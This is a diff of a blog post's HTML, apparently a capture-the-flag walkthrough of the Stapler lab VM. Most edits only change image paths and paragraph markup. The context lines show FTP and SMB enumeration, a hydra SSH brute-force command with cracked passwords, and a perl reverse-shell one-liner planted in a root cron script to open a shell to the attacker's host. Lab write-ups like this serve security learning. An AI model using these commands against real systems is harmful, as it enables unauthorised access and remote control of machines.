@@ -96,20 +96,20 @@ This returns a list of open ports that can be used to further enumerate each ser
 220-
 220
 </code>
-<img src="/assets/images/stapler/image.png" alt="img of ftp output" /></p>
+<img src="/img/stapler/image.png" alt="img of ftp output" /></p>
 
 <p>We are able to login anonymously and find that there is a file available for download.</p>
 
-<p><img src="/assets/images/stapler/image2.png" alt="img of ftp output" /></p>
+<p><img src="/img/stapler/image2.png" alt="img of ftp output" /></p>
 
 <p>Download the note and read it:
 Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</p>
 
-<p><img src="/assets/images/stapler/image3.png" alt="img of ftp output" /></p>
+<p><img src="/img/stapler/image3.png" alt="img of ftp output" /></p>
 
 <p>Using nmap to get the version of FTP: vsftpd 2.0.8 or later</p>
 
-<p><img src="/assets/images/stapler/image13.png" alt="img of ftp output" /></p>
+<p><img src="/img/stapler/image13.png" alt="img of ftp output" /></p>
 
 <p><strong>Port 22:</strong></p>
 
@@ -118,8 +118,9 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 <h2 id="section">```</h2>
 <p>~ Barry, don’t forget to put a message here ~
 —————————————————————–
-```
-using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4</p>
+```</p>
+
+<p>using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4</p>
 
 <p><strong>Port 139:</strong></p>
 
@@ -197,17 +198,19 @@ S-1-22-1-1026 Unix User\zoe (Local User)
 S-1-22-1-1027 Unix User\NATHAN (Local User)
 S-1-22-1-1028 Unix User\www (Local User)
 S-1-22-1-1029 Unix User\elly (Local User)
-```
-<strong>Port 666:</strong>
-Using netcat to connect to port 666 we see a bunch of gibberish.</p>
+```</p>
 
-<p><img src="/assets/images/stapler/image4.png" alt="image of gibberish" /></p>
+<p><strong>Port 666:</strong></p>
+
+<p>Using netcat to connect to port 666 we see a bunch of gibberish.</p>
+
+<p><img src="/img/stapler/image4.png" alt="image of gibberish" /></p>
 
 <p>If we capture this gibberish out to a file,
-<img src="/assets/images/stapler/image5.png" alt="image of gibberish" />
+<img src="/img/stapler/image5.png" alt="image of gibberish" />
 We see that it’s a zip file.</p>
 
-<p><img src="/assets/images/stapler/image6.png" alt="img message2.jpg" />
+<p><img src="/img/stapler/image6.png" alt="img message2.jpg" />
 This contains an interesting file message2.jpg.</p>
 
 <p><strong>Port 3306:</strong></p>
@@ -215,29 +218,29 @@ This contains an interesting file message2.jpg.</p>
 <p>I don’t have a valid username or password for mysql, but I was able to find the mysql version using netcat.</p>
 
 <p>5.7.12-0ubuntu1
-<img src="/assets/images/stapler/image7.png" alt="img mysql version" /></p>
+<img src="/img/stapler/image7.png" alt="img mysql version" /></p>
 
 <p><strong>Port 12380:</strong></p>
 
 <p>Using curl, I looked at http and https for this port to find that https was a bit more promising.</p>
 
-<p><img src="/assets/images/stapler/image8.png" alt="img curl 12380" /></p>
+<p><img src="/img/stapler/image8.png" alt="img curl 12380" /></p>
 
-<p><img src="/assets/images/stapler/image9.png" alt="img curl 12380 https" /></p>
+<p><img src="/img/stapler/image9.png" alt="img curl 12380 https" /></p>
 
-<p><img src="/assets/images/stapler/image10.png" alt="img browser 12380 https" /></p>
+<p><img src="/img/stapler/image10.png" alt="img browser 12380 https" /></p>
 
 <p>I ran gobuster to enumerate directories using a wordlist and found some interesting directories.</p>
 
-<p><img src="/assets/images/stapler/image11.png" alt="gobuster" /></p>
+<p><img src="/img/stapler/image11.png" alt="gobuster" /></p>
 
 <p>In announcements, there is a message that could lead to more information, but not super helpful to us right now.</p>
 
-<p><img src="/assets/images/stapler/image12.png" alt="announcements" /></p>
+<p><img src="/img/stapler/image12.png" alt="announcements" /></p>
 
 <p>phpmyadmin exposed is dangerous, however, since I still don’t have credentials to login there, I will leave this for a bit later.</p>
 
-<p><img src="/assets/images/stapler/image20.png" alt="announcements" /></p>
+<p><img src="/img/stapler/image20.png" alt="announcements" /></p>
 
 <p>Looking at https://192.168.1.116:12380/phpmyadmin/doc/html/index.html I was able to determine the current version of phpmyadmin to be 4.5.4.1.</p>
 
@@ -260,14 +263,14 @@ This contains an interesting file message2.jpg.</p>
 
 <p><code class="highlighter-rouge">hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh</code></p>
 
-<p><img src="/assets/images/stapler/image14.png" alt="Bruteforce" /></p>
+<p><img src="/img/stapler/image14.png" alt="Bruteforce" /></p>
 
 <p>Now I have 3 accounts that I can use to ssh to the box.
 - JBare: cookie
 - MFrei: letmein
 - Drew: qwerty</p>
 
-<p><img src="/assets/images/stapler/image15.png" alt="access through ssh" />
+<p><img src="/img/stapler/image15.png" alt="access through ssh" />
 Using the password (cookie) from above I was able to ssh to the machine.</p>
 
 <p>I then started with the enumeration steps on the box itself. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
@@ -275,13 +278,13 @@ Using the password (cookie) from above I was able to ssh to the machine.</p>
 <p><code class="highlighter-rouge">ls -lart /etc/cron.d/*</code></p>
 
 <p>logrotate looked interesting as it calls to a script using the root user.
-<img src="/assets/images/stapler/image16.png" alt="logrotate" /></p>
+<img src="/img/stapler/image16.png" alt="logrotate" /></p>
 
 <p><code class="highlighter-rouge">ls -l /usr/local/sbin/cron-logrotate.sh</code></p>
 
 <p><code class="highlighter-rouge">cat /usr/local/sbin/cron-logrotate.sh</code></p>
 
-<p><img src="/assets/images/stapler/image17.png" alt="logrotate" /></p>
+<p><img src="/img/stapler/image17.png" alt="logrotate" /></p>
 
 <p>Seeing that I had permissions to write to a script that is run by the root user every 5 minutes got me super excited!</p>
 
@@ -289,11 +292,11 @@ Using the password (cookie) from above I was able to ssh to the machine.</p>
 
 <p><code class="highlighter-rouge">perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></p>
 
-<p><img src="/assets/images/stapler/image18.png" alt="reverse shell in script" /></p>
+<p><img src="/img/stapler/image18.png" alt="reverse shell in script" /></p>
 
 <p>All that was left was to create a netcat listener on my attacking machine to listen for the reverse shell :-)</p>
 
-<p><img src="/assets/images/stapler/image19.png" alt="reverse shell connects" /></p>
+<p><img src="/img/stapler/image19.png" alt="reverse shell connects" /></p>
 
 <p><strong>BOOM!</strong></p>
 
